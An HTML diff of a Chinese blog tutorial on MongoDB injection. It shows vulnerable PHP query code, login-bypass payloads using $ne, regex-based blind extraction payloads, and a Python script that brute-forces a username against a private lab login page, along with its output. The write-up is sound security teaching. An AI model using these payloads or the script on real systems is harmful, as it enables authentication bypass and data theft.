@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>MongoDB注入（内附脚本） | oxxk blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content>
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="不停的练习才能让自己变得更强">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MongoDB注入（内附脚本）">
+<meta property="og:url" content="https://0xxk.github.io/2019/09/10/MongoDB注入/index.html">
+<meta property="og:site_name" content="oxxk blog">
+<meta property="og:description" content="不停的练习才能让自己变得更强">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://0xxk.github.io/images/MongoDB-注入-1.png">
+<meta property="og:image" content="https://0xxk.github.io/images/MongoDB-注入-2.png">
+<meta property="og:image" content="https://0xxk.github.io/images/MongoDB-注入-3.png">
+<meta property="og:image" content="https://0xxk.github.io/images/MongoDB-注入-4.png">
+<meta property="og:image" content="https://0xxk.github.io/images/MongoDB-注入-5.png">
+<meta property="og:image" content="https://0xxk.github.io/images/MongoDB-注入-6.png">
+<meta property="og:image" content="https://0xxk.github.io/images/MongoDB-注入-7.png">
+<meta property="og:updated_time" content="2019-09-10T15:29:34.543Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MongoDB注入（内附脚本）">
+<meta name="twitter:description" content="不停的练习才能让自己变得更强">
+<meta name="twitter:image" content="https://0xxk.github.io/images/MongoDB-注入-1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="oxxk blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">0xxk</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/oxxk" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">MongoDB注入（内附脚本）</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注入"><span class="post-toc-number">1.</span> <span class="post-toc-text">注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#NOSQL注入分析"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">NOSQL注入分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Mongo-shell拼接注入"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Mongo shell拼接注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#js-注入"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">js 注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHP数组注入"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">PHP数组注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#万能密码登陆"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">万能密码登陆</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#查询数据"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">查询数据</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-MongoDB注入"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">MongoDB注入（内附脚本）</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-09-10 13:49:59" datetime="2019-09-10T05:49:59.638Z"  itemprop="datePublished">2019-09-10</time>
+
+            <br id="mybreak"/>
+            
+<script>
+	mybreak.style="display:none";
+</script>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">5</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>不停的练习才能让自己变得更强</p>
+<a id="more"></a>
+
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>常规的关系型数据库存在如下注入漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from usere where id = $id *</span><br></pre></td></tr></table></figure>
+
+<p>在*号处可能会存在拼接注入</p>
+<p>但是MongoDB因所使用PHP连接库的不同，而有多种注入方法。</p>
+<h3 id="NOSQL注入分析"><a href="#NOSQL注入分析" class="headerlink" title="NOSQL注入分析"></a><strong>NOSQL注入分析</strong></h3><p><strong>按照语言分类:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.PHP数组注入</span><br><span class="line"></span><br><span class="line">2.js注入</span><br><span class="line"></span><br><span class="line">3.mongo shell拼接注入</span><br></pre></td></tr></table></figure>
+
+<p><strong>按照攻击手段分类:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.重言式</span><br><span class="line"></span><br><span class="line">2.联合查询</span><br><span class="line"></span><br><span class="line">3.javascript注入</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击危害分别如下：</strong> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mongo shell拼接注入 &gt; js 注入  &gt; PHP数组注入</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mongo-shell拼接注入"><a href="#Mongo-shell拼接注入" class="headerlink" title="Mongo shell拼接注入"></a>Mongo shell拼接注入</h3><p>漏洞代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = array(</span><br><span class="line">       &apos;$where&apos; =&gt; &quot;function login() &#123;var username = &apos;&quot;.$username.&quot;&apos;;var password = &apos;&quot;.$password.&quot;&apos;;if(username == &apos;admin&apos; &amp;&amp; password == &apos;123456&apos;) return true; else&#123; return false;&#125;&#125;&quot;</span><br><span class="line">   ); </span><br><span class="line">   $query = new MongoDB\Driver\Query($query);</span><br><span class="line">   $cursor = $manager-&gt;executeQuery($tb_users, $query)-&gt;toArray();</span><br></pre></td></tr></table></figure>
+
+<p>在这代码中直接运行了js代码，通过js代码去进行数据查询。这里的数据构建和常规sql注入的很像，可以直接通过”截断 再用’去闭合语句。</p>
+<h3 id="js-注入"><a href="#js-注入" class="headerlink" title="js 注入"></a>js 注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cmd = new MongoDB\Driver\Command([</span><br><span class="line">    &apos;eval&apos;=&gt;</span><br><span class="line">   	&apos;db.messages.find(&#123;&quot;author&quot;:&quot;&apos;.$username.&apos;&quot;&#125;).sort(&#123;&quot;addtime&quot;:-1&#125;);&apos;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP数组注入"><a href="#PHP数组注入" class="headerlink" title="PHP数组注入"></a>PHP数组注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = array(</span><br><span class="line">        &apos;username&apos; =&gt; $username,</span><br><span class="line">        &apos;password&apos; =&gt; $password,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<h4 id="万能密码登陆"><a href="#万能密码登陆" class="headerlink" title="万能密码登陆"></a>万能密码登陆</h4><p>在这里直接将’username’和’pssword’转换成JSON格式了，这里看起来没有注入。但是PHP有一个特性，在传参时能够传数组 。因此可以将username=1,passowrd=1改为username[$ne]=1，password[$ne]=1。带入数据库后就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$query = array(</span><br><span class="line">	&#123;</span><br><span class="line">		&quot;username&quot;:&#123;</span><br><span class="line">			&quot;$ne&quot;:&quot;1&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">		&quot;password&quot;:&#123;</span><br><span class="line">			&quot;$ne&quot;:&quot;1&quot;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line">db.users.find(&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这种方法类似于万能密码，将username不包括”1”的和password不包括”1”的数据返回。返回的都是对的数据，那肯定能够登陆。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/MongoDB-注入-1.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/MongoDB-注入-2.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>这样就用万能密码登陆进去了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/MongoDB-注入-3.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>将username[$ne]=1 中的$ne换成正则匹配符$regex，每次都正则匹配一个值。如果匹配正确了则数据正确，登陆成功。如果匹配错误则登陆失败。</p>
+<p>判断第一个字母是否是1，发现匹配错误登陆失败。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]=^1&amp;password[$ne]=1&amp;submit=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/MongoDB-注入-4.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>判断第一个字母是否是a，发现匹配正确登陆成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]=^a&amp;password[$ne]=1&amp;submit=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/MongoDB-注入-5.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>开始判断第二个字母，发现开头不是ab</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]=^ab&amp;password[$ne]=1&amp;submit=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/MongoDB-注入-6.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>继续往下判断，发现第二个字母是d</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]=^ad&amp;password[$ne]=1&amp;submit=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/MongoDB-注入-7.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>我们可以通过这种方法去逐个判断每个值，但是无法判断最后一个字母是什么。这时候就要用到正则$去匹配最后一个字符了。</p>
+<p>当^ad满足且^ad$也满足时，证明ad为所有字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]=^ad$&amp;password[$ne]=1&amp;submit=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<p>在这里ad明显不是所有字符，让我们用脚本跑一下。代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#! coding=utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">str1 = &apos;&apos;&apos;!&quot;#%&amp;&apos;,-/0123456789:;&lt;=&gt;@ABCDEFGHIJKLMNOPQRSTUVWXYZ_`abcdefghijklmnopqrstuvwxyz~&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">str2 = &apos;&apos;&apos;$\()*+,\.?[]^&#123;|&#125;&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">url = &apos;http://192.168.107.147/login.php&apos;</span><br><span class="line">print url</span><br><span class="line">data = &#123;</span><br><span class="line">    &apos;username[$regex]&apos;: &apos;^.&apos;,</span><br><span class="line">    &apos;password[$ne]&apos;: &apos;1&apos;,</span><br><span class="line">    &apos;submit&apos;: &apos;%E7%99%BB%E5%BD%95&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, data)</span><br><span class="line"></span><br><span class="line">body = r.text</span><br><span class="line"></span><br><span class="line">result = &apos;&apos;</span><br><span class="line"></span><br><span class="line">def go(result, str1, str2):</span><br><span class="line">    tmp = result</span><br><span class="line">    for i in str1:</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            &apos;username[$regex]&apos;: &apos;^%s&apos; % result + i,</span><br><span class="line">            &apos;password[$ne]&apos;: &apos;1&apos; ,</span><br><span class="line">            &apos;submit&apos;: &apos;%E7%99%BB%E5%BD%95&apos;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        if body == r.text:</span><br><span class="line">            tmp = result + i</span><br><span class="line">            print data</span><br><span class="line">            print(tmp)</span><br><span class="line">            go(tmp, str1, str2)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        if i == str1[-1] and body != r.text:</span><br><span class="line">            for i in str2:</span><br><span class="line">                data = &#123;</span><br><span class="line">                    &apos;username[$ne]&apos;: &apos;1&apos;,</span><br><span class="line">                    &apos;password[$regex]&apos;: &apos;^%s&apos; % result + &apos;\\&apos; + i,</span><br><span class="line">                    &apos;submit&apos;: &apos;%E7%99%BB%E5%BD%95&apos;</span><br><span class="line">                &#125;</span><br><span class="line">                r = requests.post(url, data)</span><br><span class="line">                if body == r.text:</span><br><span class="line">                    tmp = result + i</span><br><span class="line">                    print(tmp)</span><br><span class="line">                    go(tmp, str1, str2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">go(result, str1, str2)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;username[$regex]&apos;: &apos;^a&apos;, &apos;submit&apos;: &apos;%E7%99%BB%E5%BD%95&apos;, &apos;password[$ne]&apos;: &apos;1&apos;&#125;</span><br><span class="line">a</span><br><span class="line">&#123;&apos;username[$regex]&apos;: &apos;^ad&apos;, &apos;submit&apos;: &apos;%E7%99%BB%E5%BD%95&apos;, &apos;password[$ne]&apos;: &apos;1&apos;&#125;</span><br><span class="line">ad</span><br><span class="line">&#123;&apos;username[$regex]&apos;: &apos;^adm&apos;, &apos;submit&apos;: &apos;%E7%99%BB%E5%BD%95&apos;, &apos;password[$ne]&apos;: &apos;1&apos;&#125;</span><br><span class="line">adm</span><br><span class="line">&#123;&apos;username[$regex]&apos;: &apos;^admi&apos;, &apos;submit&apos;: &apos;%E7%99%BB%E5%BD%95&apos;, &apos;password[$ne]&apos;: &apos;1&apos;&#125;</span><br><span class="line">admi</span><br><span class="line">&#123;&apos;username[$regex]&apos;: &apos;^admin&apos;, &apos;submit&apos;: &apos;%E7%99%BB%E5%BD%95&apos;, &apos;password[$ne]&apos;: &apos;1&apos;&#125;</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
+
+<p>可以看到用户名为admin，密码也可以用这种方法爆破故此不再重复。</p>
+<p>但是PHP数组注入充满了<strong>局限性</strong>，只能够查本表中的数据。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-09-10T15:29:34.543Z" itemprop="dateUpdated">2019-09-10 23:29:34</time>
+</span>
+
+
+        
+        原文链接：<a href="/2019/09/10/MongoDB注入/" target="_blank" rel="external">https://0xxk.github.io/2019/09/10/MongoDB注入/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://0xxk.github.io'">
+            <img src="/img/avatar.jpg" alt="0xxk">
+            <a>0xxk</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/10/MongoDB注入/&title=《MongoDB注入（内附脚本）》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/10/MongoDB注入/&title=《MongoDB注入（内附脚本）》 — oxxk blog&source=不停的练习才能让自己变得更强" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/10/MongoDB注入/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MongoDB注入（内附脚本）》 — oxxk blog&url=https://0xxk.github.io/2019/09/10/MongoDB注入/&via=https://0xxk.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/10/MongoDB注入/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/09/10/MongoDB基础知识/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：MongoDB数据库从基础到删库
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/09/09/MSSQL and Access/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：MSSSQL AND Access注入（内附脚本）">下一篇：MSSSQL AND Access注入（内附脚本）</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2017
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://0xxk.github.io">tomotoes.com</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/10/MongoDB注入/&title=《MongoDB注入（内附脚本）》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/10/MongoDB注入/&title=《MongoDB注入（内附脚本）》 — oxxk blog&source=不停的练习才能让自己变得更强" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/10/MongoDB注入/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MongoDB注入（内附脚本）》 — oxxk blog&url=https://0xxk.github.io/2019/09/10/MongoDB注入/&via=https://0xxk.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/10/MongoDB注入/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
